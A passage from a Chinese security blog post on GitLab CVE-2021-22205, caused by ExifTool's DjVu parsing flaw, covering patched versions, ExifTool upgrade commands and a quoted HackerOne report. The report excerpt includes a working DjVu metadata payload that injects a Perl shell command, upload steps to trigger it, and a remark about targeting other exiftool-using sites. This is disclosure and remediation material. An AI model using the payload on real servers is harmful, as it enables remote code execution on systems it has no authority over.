</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=1b38f7223abe3db3e.png alt></p><p>（截图源自<a href=https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/>在野利用分析文章</a>）</p><p>这里只是overview，有空了仔细分析整个调用流程。</p><h1 id=修复>修复<a hidden class=anchor aria-hidden=true href=#修复>#</a></h1><p>参考 <a href=https://docs.gitlab.com/ee/update/package/index.html#upgrade-to-a-specific-version-using-the-official-repositories>https://docs.gitlab.com/ee/update/package/index.html#upgrade-to-a-specific-version-using-the-official-repositories</a> 将GitLab升级到安全版本。</p><p>安全版本的GitLab底层使用了安全版本的ExifTool，并且在将文件传给ExiTool处理前，添加了对文件格式的判断。</p><p>为了避免兼容性问题，只需要升级到对应小版本的安全版本即可，<strong>并不一定要升级大版本</strong>。</p><table><thead><tr><th>组件</th><th>影响版本</th><th>安全版本</th></tr></thead><tbody><tr><td>GitLab(CE/EE)</td><td>&lt;13.8.8 & >= 11.9</td><td>13.8.8</td></tr><tr><td>GitLab(CE/EE)</td><td>&lt;13.9.6 & >= 13.9</td><td>13.9.6</td></tr><tr><td>GitLab(CE/EE)</td><td>&lt;13.10.3 & >= 13.10</td><td>13.10.3</td></tr></tbody></table><h1 id=缓解>缓解<a hidden class=anchor aria-hidden=true href=#缓解>#</a></h1><p>简言之</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt install -y libimage-exiftool-perl
</span></span></code></pre></td></tr></table></div></div><p>具体来说</p><p><a href=https://gitlab.com/gitlab-org/gitlab/-/issues/327121>这个帖子</a> 讨论了的漏洞根因和应对方案。其中一种是行之有效并且易于操作的，就是升级ExifTool。</p><blockquote><p>Warkeeper @Warkeeper · 4 months ago
@rshambhuni The version of GitLab I installed from source is &ldquo;13.6.1 (c0876634cc0)&rdquo; (I cloned it from GitHub&rsquo;s master branch some day in April), and it&rsquo;s running on ubuntu 18.04. I reproduced this issue in my setup and found that my setup is also affected by it.</p><p>After reading the description of CVE-2021-22205 and this issue, I think it&rsquo;s mostly the fault of &ldquo;ExifTool&rdquo;.
Since Ubuntu has released a security version of &ldquo;ExifTool&rdquo;, I tried to update ExifTool to 10.80-1ubuntu0.1 in my setup, and after that, I can&rsquo;t reproduce this issue.</p><p>But I&rsquo;m not sure if updating ExifTool is safe enough for this issue, should I update my GitLab as well?</p><p>Heinrich Lee Yu @engwan · 4 months ago Maintainer
Yes, upgrading exiftool would prevent the vulnerability. It would still be good to upgrade GitLab though since we added extra checks to prevent other file types from being processed by exiftool.</p><p>There was also another severity 1 vulnerability that was fixed in the same critical security release.</p><p>——https://gitlab.com/gitlab-org/gitlab/-/issues/327121#note_614878062</p></blockquote><p>由于漏洞本质上是由ExifTool的<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204">CVE-2021-22204</a>引起的，所以升级ExifTool理论上是能够缓解漏洞的。</p><blockquote><p>Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image</p><p><a href=https://github.com/exiftool/exiftool/commit/cf0f4e7dcd024ca99615bfd1102a841a25dde031#diff-fa0d652d10dbcd246e6b1df16c1e992931d3bb717a7e36157596b76bdadb3800>Upstream patch</a></p><p>——https://bugs.launchpad.net/ubuntu/+source/libimage-exiftool-perl/+bug/1925985</p></blockquote><p>ExifTool在Linux上软件包名叫做 <code>libimage-exiftool-perl</code>，不同发行版上不受<code>CVE-2021-22204</code>影响的安全版本列表如下：</p><blockquote><table><thead><tr><th style=text-align:left>Release</th><th style=text-align:left>Version</th></tr></thead><tbody><tr><td style=text-align:left>stretch</td><td style=text-align:left>10.40-1</td></tr><tr><td style=text-align:left>stretch (security)</td><td style=text-align:left>10.40-1+deb9u1</td></tr><tr><td style=text-align:left>buster</td><td style=text-align:left>11.16-1+deb10u1</td></tr><tr><td style=text-align:left>bullseye</td><td style=text-align:left>12.16+dfsg-2</td></tr><tr><td style=text-align:left>bookworm</td><td style=text-align:left>12.33+dfsg-1</td></tr><tr><td style=text-align:left>sid</td><td style=text-align:left>12.34+dfsg-1</td></tr></tbody></table><p>——https://security-tracker.debian.org/tracker/source-package/libimage-exiftool-perl</p></blockquote><p>具体操作如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>查看一个软件的可安装版本
</span></span><span style=display:flex><span>apt-cache madison libimage-exiftool-perl
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>安装某低版本的ExifTool
</span></span><span style=display:flex><span>sudo apt install libimage-exiftool-perl=11.88-1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>查看已安装ExifTool的版本
</span></span><span style=display:flex><span>exiftool -ver
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>升级ExifTool版本到最新
</span></span><span style=display:flex><span>sudo apt install -y libimage-exiftool-perl
</span></span></code></pre></td></tr></table></div></div><p>操作示例：</p><p><img loading=lazy src=9efbf385d7196d719.png alt></p><p>实测有效的覆盖更新方法（在Ubuntu18.04上从exiftool 11.7升级到12.34）</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-15>15</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># 搭建测试环境：</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 从 https://packages.gitlab.com/app/gitlab/gitlab-ce/search?q=13.8.0&amp;filter=debs&amp;filter=debs&amp;dist=ubuntu 下载gitlab包</span>
</span></span><span style=display:flex><span>dpkg -i pkgname.deb
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 下载 libimage-exiftool-perl_12.34+dfsg-1_all.deb</span>
</span></span><span style=display:flex><span>wget http://mirrors.aliyun.com/ubuntu/pool/universe/libi/libimage-exiftool-perl/libimage-exiftool-perl_12.34%2Bdfsg-1_all.deb
</span></span><span style=display:flex><span><span style=color:#75715e># 安装</span>
</span></span><span style=display:flex><span>dpkg -i libimage-exiftool-perl_12.34+dfsg-1_all.deb
</span></span><span style=display:flex><span><span style=color:#75715e># 备份</span>
</span></span><span style=display:flex><span>tar czf /tmp/exiftool_1170.tgz /opt/gitlab/embedded/lib/exiftool-perl/ /opt/gitlab/embedded/bin/exiftool
</span></span><span style=display:flex><span><span style=color:#75715e># 覆盖内嵌exiftool及其依赖</span>
</span></span><span style=display:flex><span>cp /usr/bin/exiftool /opt/gitlab/embedded/bin/exiftool
</span></span><span style=display:flex><span>cp -r /usr/share/perl5/Image/ExifTool /opt/gitlab/embedded/lib/exiftool-perl/
</span></span><span style=display:flex><span>cp /usr/share/perl5/File/RandomAccess.pm /opt/gitlab/embedded/lib/exiftool-perl/File/
</span></span><span style=display:flex><span>cp /usr/share/perl5/File/RandomAccess.pod /opt/gitlab/embedded/lib/exiftool-perl/File/
</span></span></code></pre></td></tr></table></div></div><p>其他OS，如centos，到 <a href=https://pkgs.org/download/libimage-exiftool-perl>https://pkgs.org/download/libimage-exiftool-perl</a> 页面下载包，参考https://exiftool.org/install.html#Unix 编译后替换gitlab内嵌的exiftool及其依赖。</p><h1 id=原始报告>原始报告<a hidden class=anchor aria-hidden=true href=#原始报告>#</a></h1><p>链接：https://hackerone.com/reports/1154542</p><p>部分节选如下</p><blockquote><h3 id=summary>Summary<a hidden class=anchor aria-hidden=true href=#summary>#</a></h3><p>When uploading image files, GitLab Workhorse passes any files with the extensions <a href=https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104>jpg|jpeg|tiff</a> through to <a href=https://exiftool.org/>ExifTool</a> to remove any non-whitelisted tags.</p><p>An issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.</p><p>One of the supported formats is <a href=https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm>DjVu</a>. When parsing the DjVu annotation, the <a href=https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233>tokens are evaled</a> to &ldquo;convert C escape sequences&rdquo;.</p><p>There is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:</p><p><strong>Code</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(metadata
</span></span><span style=display:flex><span>	(Copyright &#34;\
</span></span><span style=display:flex><span>&#34; . qx{echo vakzz &gt;/tmp/vakzz} . \
</span></span><span style=display:flex><span>&#34; b &#34;) )
</span></span></code></pre></td></tr></table></div></div><p><code>echo_vakzz.jpg.zip</code> is an example DjVu file with the above metadata, and <code>reverse_shell.jpg.zip</code> is an example that runs a reverse shell.</p><h3 id=steps-to-reproduce>Steps to reproduce<a hidden class=anchor aria-hidden=true href=#steps-to-reproduce>#</a></h3><ol><li>Download <code>echo_vakzz.jpg.zip</code> and unzip it</li><li>Create a new snippet</li><li>In the description field, hit &ldquo;Attach a file&rdquo;</li><li>Select and uplaod <code>echo_vakzz.jpg</code></li><li>See that the file <code>/tmp/vakzz</code> has been created on the server</li></ol><p>Uploading <code>reverse_shell.jpg.zip</code> to <a href=https://gitlab.com/-/snippets/new>https://gitlab.com/-/snippets/new</a> resulted in a shell on <code>web-09-sv-gprd</code></p></blockquote><h1 id=bonus>bonus<a hidden class=anchor aria-hidden=true href=#bonus>#</a></h1><p>使用exiftool的网站都可能受影响，或许是个金矿。测试方法应该是上传再下载，看看元数据是否还被保留。如果被删除了，有一定可能性图片在后端处理时经过了exiftool。</p><blockquote><p>There are lots of websites that will display the EXIF data for an image, and also image sharing websites like Flickr and 500px will provide EXIF data for uploaded images by default. Don’t know how many of those use this tool, but I suspect there are lots of bug bounties to be had from this vulnerability.</p><p>——https://old.reddit.com/r/netsec/comments/n36x7h/arbitrary_code_execution_in_exiftool/gwpgk3v/</p></blockquote><p><img loading=lazy src=51dd4e63994ff1547.png alt></p><h1 id=参考链接>参考链接<a hidden class=anchor aria-hidden=true href=#参考链接>#</a></h1><p><a href=https://hackerone.com/reports/1154542>https://hackerone.com/reports/1154542</a></p><p><a href=https://gitlab.com/gitlab-org/gitlab/-/issues/327121>https://gitlab.com/gitlab-org/gitlab/-/issues/327121</a></p><p><a href=https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/>https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/</a></p><p><a href=https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233>https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233</a></p><p><a href=https://www.reddit.com/r/netsec/comments/qfbea1/gitlab_ce_cve202122205_in_the_wild/>https://www.reddit.com/r/netsec/comments/qfbea1/gitlab_ce_cve202122205_in_the_wild/</a></p><p><a href=https://old.reddit.com/r/netsec/comments/n36x7h/arbitrary_code_execution_in_exiftool/gwpgk3v/>https://old.reddit.com/r/netsec/comments/n36x7h/arbitrary_code_execution_in_exiftool/gwpgk3v/</a></p><p><a href=https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/#Remote-code-execution-when-uploading-specially-crafted-image-files>https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/#Remote-code-execution-when-uploading-specially-crafted-image-files</a></p><p><a href=https://bugs.launchpad.net/ubuntu/+source/libimage-exiftool-perl/+bug/1925985>https://bugs.launchpad.net/ubuntu/+source/libimage-exiftool-perl/+bug/1925985</a></p><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204</a></p><p><a href=https://security-tracker.debian.org/tracker/source-package/libimage-exiftool-perl>https://security-tracker.debian.org/tracker/source-package/libimage-exiftool-perl</a></p><p><a href=https://docs.gitlab.com/ee/update/package/index.html#upgrade-to-a-specific-version-using-the-official-repositories>https://docs.gitlab.com/ee/update/package/index.html#upgrade-to-a-specific-version-using-the-official-repositories</a></p><p><a href=https://twitter.com/pdnuclei/status/1453351196350029829>https://twitter.com/pdnuclei/status/1453351196350029829</a></p><p><a href=https://github.com/CsEnox/Gitlab-Exiftool-RCE/blob/main/exploit.py>https://github.com/CsEnox/Gitlab-Exiftool-RCE/blob/main/exploit.py</a></p><p><a href=https://github.com/mr-r3bot/Gitlab-CVE-2021-22205>https://github.com/mr-r3bot/Gitlab-CVE-2021-22205</a></p><p><a href=https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205>https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205</a></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/220317-howto-install-oracle-access-manager/><span class=title>« Prev</span><br><span>如何搭建 Oracle Access Manager</span></a>
<a class=next href=https://ret2neo.cn/post/210721-build-proxenet-using-docker/><span class=title>Next »</span><br><span>使用docker构建proxenet</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>